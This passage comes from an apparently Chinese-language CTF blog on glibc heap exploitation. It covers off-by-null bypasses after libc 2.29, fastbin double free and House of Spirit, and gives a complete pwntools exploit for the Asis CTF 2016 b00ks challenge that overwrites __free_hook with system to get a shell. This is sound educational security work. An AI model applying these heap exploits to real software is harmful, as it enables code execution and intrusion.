是否一致。</li></ol><p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check 。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>      <span class="hljs-comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>      unlink_chunk (av, p);<br>    &#125;<br></code></pre></div></td></tr></table></figure><h2 id="在-libc-2-29-之后"><a href="#在-libc-2-29-之后" class="headerlink" title="在 libc-2.29 之后"></a>在 libc-2.29 之后</h2><p>由于这两行代码的加入</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>  malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>由于我们难以控制一个真实 chunk 的 size 字段，所以传统的 off-by-null 方法失效。但是，只需要满足被 unlink 的 chunk 和下一个 chunk 相连，所以仍然可以伪造 fake_chunk。</p><p>伪造的方式就是使用 large bin 遗留的 fd_nextsize 和 bk_nextsize 指针。以 fd_nextsize 为 fake_chunk 的 fd，bk_nextsize 为 fake_chunk 的 bk，这样我们可以完全控制该 fake_chunk 的 size 字段（这个过程会破坏原 larg e bin chunk 的 fd 指针，但是没有关系），同时还可以控制其 fd（通过部分覆写 fd_nextsize）。通过在后面使用其他的 ch22    `unk 辅助伪造，可以通过该检测</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>  malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>然后只需要通过 unlink 的检测就可以了，也就是 <code>fd-&gt;bk == p &amp;&amp; bk-&gt;fd == p</code></p><p>如果 large bin 中仅有一个 chunk，那么该 chunk 的两个 nextsize 指针都会指向自己，如下</p><img src="../../image/ptmalloc_exp/largebin-struct.png" style="zoom:80%;" /><p>我们可以控制 fd_nextsize 指向堆上的任意地址，可以容易地使之指向一个 fastbin + 0x10 - 0x18，而 fastbin 中的 fd 也会指向堆上的一个地址，通过部分覆写该指针也可以使该指针指向之前的 large bin + 0x10，这样就可以通过 <code>fd-&gt;bk == p</code> 的检测。</p><p>由于 bk_nextsize 我们无法修改，所以 bk-&gt;fd 必然在原先的 large bin chunk 的 fd 指针处（这个 fd 被我们破坏了）。通过 fastbin 的链表特性可以做到修改这个指针且不影响其他的数据，再部分覆写之就可以通过 <code>bk-&gt;fd==p</code> 的检测了。</p><p>然后通过 off-by-one 向低地址合并就可以实现 chunk overlapping 了，之后可以 leak libc_base 和 堆地址，tcache 打 <code>__free_hook</code> 即可。</p><h2 id="示例-Asis-CTF-2016-b00ks"><a href="#示例-Asis-CTF-2016-b00ks" class="headerlink" title="示例: Asis CTF 2016 b00ks"></a>示例: Asis CTF 2016 b00ks</h2><p>先patch成glibc 2.27的版本. 只要小于2.29都一个样. </p><img src="../../image/ptmalloc_exp/image-20220810113456363.png" alt="image-20220810113456363" style="zoom:80%;" /><p>一进入程序先要求设置author name, 还可以通过change功能来更改, 最长为32. 不过在stdin_read函数中边界检查不正确导致结尾空字符溢出. </p><p>create里malloc流程: name-&gt;description-&gt;book. 前两个为自己设定, 最后一个为0x20字节. </p><p>通过查看data中变量布局可以看到author name在slot_array上方, 这个array存的是一堆book类型的指针, 这个结构体使用malloc来分配空间: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">book</span>&#123;</span><br>    <span class="hljs-keyword">int</span> id;<span class="hljs-comment">//占8字节, 对齐</span><br>    <span class="hljs-keyword">char</span>* name;<br>    <span class="hljs-keyword">char</span>* description;<br>    <span class="hljs-keyword">int</span> size;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>所以先让author name的结尾空字符溢出到book1的指针最低字节, 然后读取出detail就会连带打印出book1的指针, 这样就泄露出了一个<strong>堆地址</strong>. </p><p>还可以通过清空最低字节来使指针指向我们控制的一个堆块(比如说通过edit修改的desc), 这样会自动认为那是一个book结构体, 从而在print时解引用name和desc指针, 打印出相应地址上的值. 还可以在edit中修改desc指向的地址, 从而达到了任意地址读写的能力. </p><p>具体过程如下:</p><ul><li>程序刚开始, 第一个malloc会从0x5633ca39c260开始. 注意到最后三位是0x260. </li><li>为了实现利用, 要让book1的desc mem ptr(和chunk ptr相对, 联系chunk2mem)的最低字节为0x00.</li><li>最近的地址肯定是0x300, 所以desc chunk ptr为0x2f0, 留给name chunk的大小为0x90. </li><li>0x90需要我们申请0x80的空间. 即<code>create(0x80, &#39;a&#39;, 0x50, &#39;a&#39;)</code> </li></ul><p>gdb中查看, 一通操作后book1的指针最低字节清空后刚好是book1的desc用户指针:</p><img src="../../image/ptmalloc_exp/image-20220810200039356.png" alt="image-20220810200039356" style="zoom:80%;" /><ul><li>然后在desc里面伪造一个book结构体, name和desc均可用来任意读, desc能用来任意写(通过edit). </li></ul><p>通过一个堆地址可以推断出elf基地址和<strong>其他chunk的相对位置</strong>, 接下来的方法比如说<code>__free_hook</code>, free_got(因为FULL RELRO导致不可用). 需要libc基地址, 有两种方法:</p><ol><li>通过mmap, 这样分配的chunk会和libc有固定偏移. </li><li>通过largebin的fd_nextsize. 只有一组大小相同的元素时会指向libc中的large head.</li></ol><p>只有在topchunk(一般是这样, 题目刚开始的时候top chunk是最大的chunk, 只要申请比这大的chunk即可实现mmap分配)不够用的时候才会使用mmap, 通过gdb看到topchunk一开始是0x21000. 由于开头两个chunk被用来存管理heap的结构体, 所以<strong>直接申请0x21000的堆块即可</strong>. 还要将name或desc写成<code>&#39;/bin/sh&#39;</code> </p><p>申请后: </p><img src="../../image/ptmalloc_exp/image-20220810201642255.png" alt="image-20220810201642255" style="zoom:80%;" /><p>name和desc分别分到了这两个位置:</p><img src="../../image/ptmalloc_exp/image-20220810201820968.png" alt="image-20220810201820968" style="zoom:80%;" /><p>注意到申请的是0x21000, 实际大小是0x22000, 这是因为加上header的0x10字节后进行page对齐的结果.</p><p>由于发现ld.so之后的两个anonym之间有空隙, 空隙大小随机化, mmap大概率放在空隙之后的anonym中, 导致到libc.so的偏移不是固定值. 如果随机化后结果都放在ld.so中间, 那么应该是可行的, 不过要多尝试几次. </p><p>到这里的流程如下:</p><ul><li>对book1的desc fake chunk进行修改, 进行一次任意读, 读取book2的name的值. 这个name地址用之前leak的book1地址加上一个偏移即可</li><li>两个book的chunk紧挨着的, 这个偏移为0x38, 和0x40, 即可定位到book2的name和desc指针的地址. </li><li>然后找到<code>__free_hook</code> </li><li>使用desc任意写覆盖<code>__free_hook</code>为<code>system</code>, </li><li>执行delete </li><li>成功shell. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">from numpy <span class="hljs-keyword">import</span> lib<br>from pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./b00ks&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(binary)<br>ss=lambda x:p.send(x)       <span class="hljs-meta">#send string</span><br>sl=lambda x:p.sendline(x)<br>ru=lambda x:p.recvuntil(x)<br>rl=lambda :p.recvline()<br>ra=lambda :p.recv()         <span class="hljs-meta">#recv a</span><br>rn=lambda x:p.recv(x)       <span class="hljs-meta">#recv n</span><br>itt=lambda :p.interactive()<br>sla=lambda x,y:p.sendlineafter(x,y)<br><br>def firstAuthorName(name:str):<br>    ru(<span class="hljs-string">&#x27;name: &#x27;</span>)<br>    sl(name)<br><br>def create(name_size, name, desc_size, desc):<br>    ru(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(str(name_size))<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(name)<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(str(desc_size))<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(desc)<br><br>def change(authorName):<br>    ru(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;5&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(authorName)<br><br>def edit(id: <span class="hljs-keyword">int</span>, desc: bytes):<br>    ru(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(str(id))<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(desc)<br>    left = rl()+rl()<br>    <span class="hljs-keyword">if</span> b<span class="hljs-number">&#x27;U</span>nable<span class="hljs-number">&#x27;</span> in left:<br>        <span class="hljs-built_in">log</span>.error(<span class="hljs-string">&#x27;aslr not match expection!&#x27;</span>)<br><br>def get_detail() -&gt; tuple[<span class="hljs-keyword">int</span>, bytes, bytes, bytes]:<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span>only support get first book!!<span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    ru(b<span class="hljs-number">&#x27;</span>&gt; <span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    sl(b&#x27;</span><span class="hljs-number">4&#x27;</span>)<br>    line = rl()<br>    id = <span class="hljs-keyword">int</span>.from_bytes(line[<span class="hljs-number">4</span>:], byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>    name = rl()[<span class="hljs-number">6</span>:]<br>    desc = rl()[len(<span class="hljs-string">&#x27;Description: &#x27;</span>):]<br>    author =  rl()[len(<span class="hljs-string">&#x27;Author: &#x27;</span>):]<br>    <span class="hljs-keyword">return</span> id, name, desc, author<br><br>def <span class="hljs-keyword">delete</span>(id):<br>    ru(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(str(id))<br><br><span class="hljs-meta">#main function!!!</span><br>def main():<br>    firstAuthorName(cyclic(<span class="hljs-number">32</span>))<br>    create(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>    create(<span class="hljs-number">0x20000</span><span class="hljs-number">-0x10</span>, <span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-number">0x20000</span><span class="hljs-number">-0x10</span>, <span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>    id, name, desc, author = get_detail()<br>    book1_addr = <span class="hljs-keyword">int</span>.from_bytes(author[<span class="hljs-number">32</span>:<span class="hljs-number">32</span>+<span class="hljs-number">6</span>], byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-built_in">log</span>.success(f<span class="hljs-number">&#x27;</span>get book <span class="hljs-number">1</span> struct pointer: &#123;hex(book1_addr)&#125;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # addr-0x60 point to itself in book1_desc</span><br><span class="hljs-string">    payload = flat([1, book1_addr+0x38, book1_addr-0x60, 0x50])</span><br><span class="hljs-string">    edit(1, payload)</span><br><span class="hljs-string">    change(cyclic(32))</span><br><span class="hljs-string">    id, name, desc, author = get_detail()</span><br><span class="hljs-string">    book2_name_addr = int.from_bytes(name, byteorder=&#x27;</span>little<span class="hljs-number">&#x27;</span>) &amp; <span class="hljs-number">0xffffffffffff</span><br>    <span class="hljs-built_in">log</span>.success(f<span class="hljs-number">&#x27;b</span>ook2 name addr: &#123;hex(book2_name_addr)&#125;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    libc = ELF(&#x27;</span>/glibs/<span class="hljs-number">2.27</span><span class="hljs-number">-3u</span>buntu1_amd64/libc<span class="hljs-number">-2.27</span>.so<span class="hljs-number">&#x27;</span>)<br>    libc_base = book2_name_addr - <span class="hljs-number">0x606010</span><br>    __free_hook_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    <span class="hljs-built_in">log</span>.success(f<span class="hljs-number">&#x27;</span>__free_hook: &#123;hex(__free_hook_addr)&#125;\t system_addr: &#123;hex(system_addr)&#125;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    payload = flat([1, book1_addr+0x38+0x90, __free_hook_addr, 0x50])</span><br><span class="hljs-string">    edit(1, payload)</span><br><span class="hljs-string">    edit(1, pack(system_addr))</span><br><span class="hljs-string">    delete(2)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # gdb.attach(p)</span><br><span class="hljs-string">    itt()</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &#x27;</span>__main__<span class="hljs-number">&#x27;</span>:<br>    main()<br></code></pre></div></td></tr></table></figure><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><ol><li>chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping</li><li>通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用</li></ol><p>例题也是heapstorm2. </p><h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><p>几乎全为<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">CTF-WiKi</a>, 做了些修改以及添加了一点个人想法</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p><ul><li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li><li>漏洞发生于 fastbin 类型的 chunk 中</li></ul><p>如果细分的话，可以做如下的分类：</p><ul><li><strong>Fastbin Double Free</strong> </li><li><strong>House of Spirit</strong> </li><li><strong>Alloc to Stack</strong> </li><li><strong>Arbitrary Alloc</strong> </li></ul><p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p><ol><li>fastbin 的堆块被释放后 next_chunk 的 <strong>pre_inuse</strong> 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 <strong>main_arena</strong> 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> pre_size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fd;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br>CHUNK bss_chunk;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *chunk1,*chunk2,*chunk3;<br>    <span class="hljs-keyword">void</span> *chunk_a,*chunk_b;<br><br>    bss_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk_a=&amp;bss_chunk;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk_b=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p&quot;</span>,chunk_b);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p><p>该技术的核心在于<strong>在目标位置处伪造 fastbin chunk，并将其释放</strong>，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>这里就直接以 how2heap 上的例子进行说明，如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *a;<br>    <span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">7</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);<br>    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);<br>        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span><br>    fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);<br>    a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the overwritten pointer.\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行后的效果如下</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 